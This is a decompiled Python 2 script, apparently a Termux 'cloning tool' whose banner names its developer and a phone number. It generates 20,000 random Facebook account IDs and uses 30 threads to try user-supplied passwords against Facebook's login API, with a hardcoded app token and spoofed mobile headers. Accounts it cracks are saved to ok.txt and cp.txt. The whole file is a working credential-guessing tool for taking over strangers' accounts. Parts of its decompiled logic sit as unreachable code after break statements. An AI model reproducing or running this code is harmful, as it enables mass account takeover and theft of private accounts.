# Source Generated with Decompyle++
# File: out.pyc (Python 2.7)

import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import uuid
import subprocess
import calendar
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from datetime import date
from datetime import datetime

try:
    import storage
    import requests
    import mechanize
    import bs4
    import futures
except ImportError:
    os.system('termux-setup-storage')
    os.system('clear')
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('pip2 install bs4')
    os.system('pip2 install futures')
    os.system('clear')


try:
    os.mkdir('/sdcard/ids')
except:
    pass


try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.mkdir('/sdcard/.data.txt')

reload(sys)
sys.setdefaultencoding('utf8')
ua = random.choice([
    'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
    'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
    'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
    'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0 Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537',
    'Mozilla/5.0 (Linux; Android 10; Infinix X687 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/FB4A;FBAV/222.0.0.48.113;]',
    'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
    'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
    'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)',
    'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G977N/KSU4CTG1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36'])
url = 'https://mbasic.facebook.com'
os.system('clear')
logo = '\n     \x1b[1;92m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97  \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n     \x1b[1;92m\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x90\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\n     \x1b[1;92m\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91    \xe2\x95\x94\xe2\x95\x9d\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\n     \x1b[1;93m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91   \xe2\x95\x94\xe2\x95\x9d\xe2\x95\x94\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\n     \x1b[1;93m\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91  \xe2\x95\x94\xe2\x95\x9d\xe2\x95\x90\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\n     \x1b[1;92m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x9d\n\x1b[1;93m______________________________________________________\n \x1b[1;93m(*)\x1b[1;92m Developer : SYED SHAWAIZ SHAH \x1b[1;33m\xf0\x9f\x94\xa5SYED-ZADA\xf0\x9f\x94\xa5\n \x1b[1;93m(*)\x1b[1;92m WhatsApp  : 03423600767\n \x1b[1;93m(*)\x1b[1;92m Tool type : Cloning Tool\n \x1b[1;93m(*)\x1b[1;92m Github    : https://github.com/syedzada1100\n\x1b[1;93m______________________________________________________\n'
loop = 0
id = []
cp = []
ok = []

def main_button():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/syedshawaizshah655')
    print logo
    print '\x1b[1;92m[1] \x1b[1;93mSTART CRACKING'
    print '\x1b[1;92m[2] \x1b[1;93mOwner Contact'
    print '\x1b[1;92m[3] \x1b[1;93mJoin Our Facebook Group'
    print '\x1b[1;92m[4] \x1b[1;93mSubscribe Our YouTube'
    print '\x1b[1;92m[0] \x1b[1;93mExit'
    print '\x1b[1;93m______________________________________________________'
    print 
    Syed_Zada()


def Syed_Zada():
    input0 = raw_input('Choose Option : \x1b[0;92m')
    if input0 == '1':
        Syed().__menu__()
    elif input0 == '2':
        os.system('xdg-open https://www.facebook.com/syedshawaizshah655')
        main_button()
    elif input0 == '3':
        os.system('xdg-open https://www.facebook.com/groups/499609241591106/?ref=share_group_link')
        main_button()
    elif input0 == '4':
        os.system('xdg-open https://youtube.com/channel/UCv3xnTA7veQe64UYUwDybEg')
        main_button()
    elif input0 == '0':
        os.system('exit')
    else:
        print ''
        print '\x1b[1;91m\tChoose correct option'
        print ''
        main_button()


class Syed:
    
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0

    
    def __menu__(self):
        os.system('clear')
        os.system('xdg-open https://youtube.com/channel/UCv3xnTA7veQe64UYUwDybEg')
        print logo
        print ' \x1b[1;93m[1]\x1b[1;92m OLD ACCOUNT CLONING\n '
        print ' \x1b[1;93m[0]\x1b[1;92m BACK'
        print 54 * '\x1b[1;93m_'
        choose = raw_input('\n\x1b[1;93m Choose Option :  ')
        print ''
        if choose in ('',):
            print ' \t\x1b[1;91m[!] Sorry Your Choice Wrong'
            Syed().__menu__()
        elif choose in ('1', '01'):
            self.__fb__()
        elif choose in ('0', '00'):
            main_button()
        else:
            Syed().__menu__()

    
    def __fb__(self):
        x = 11111111
        xx = 99999999
        idx = '1000000'
        
        try:
            for i in range(20000):
                i = random.randint(x, xx)
                ib = idx
                self.id.append(ib + str(i))
            
            with ThreadPoolExecutor(max_workers = 30) as coeg:
                print '   [\x1b[1;97m\x1b[1;41m For Example :  123456 , 12345678 , 123456789 \x1b[0m\x1b[1;93m]'
                print ''
                listpass = raw_input(' \x1b[1;92m[+]\x1b[1;93m Enter password : \x1b[1;92m')
                if len(listpass) <= 5:
                    exit('\n  [!] password minimum 6 characters')
                print 54 * '\x1b[1;93m_'
                print ''
                time.sleep(1)
                print '\x1b[1;93m Total idzz : \x1b[0;92m%s' % len(self.id)
                print '\x1b[1;93m The Process has been Started'
                print '\x1b[1;93m Plzz wait to Crack idzz'
                print 54 * '\x1b[1;93m_'
                time.sleep(1)
                print ''
                print '      [\x1b[1;97m\x1b[1;41m  Use Airplane mode For Speedup Cloning  \x1b[0m\x1b[1;93m]'
                print 54 * '_'
                print ''
                for user in self.id:
                    coeg.submit(self.__api__, user, listpass.split(','))
            exit('\n\n \x1b[1;92m[+] Crack Finished...')
        except Exception:
            e = None
            exit(str(e))


    
    def __api__(self, uid, pwx):
        ua = random.choice([
            'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
            'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
            'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'])
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': ua,
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger' }
            response = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = headers)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '    \x1b[1;92m[SYED-ZADA-OK] %s | %s\x1b[0;97m         ' % (uid, pw)
                self.ok.append('%s|%s' % (uid, pw))
                open('ok.txt', 'a').write(' %s|%s\n' % (uid, pw))
                break
                continue
                if 'www.facebook.com' in response.json()['error_msg']:
                    print '    \x1b[1;93m[SYED-ZADA-CP] %s | %s\x1b[0;97m         ' % (uid, pw)
                    self.cp.append('%s|%s' % (uid, pw))
                    open('cp.txt', 'a').write(' %s|%s\n' % (uid, pw))
                    break
                    continue
                    continue
                self.loop += 1
                return None


if __name__ == '__main__':
    main_button()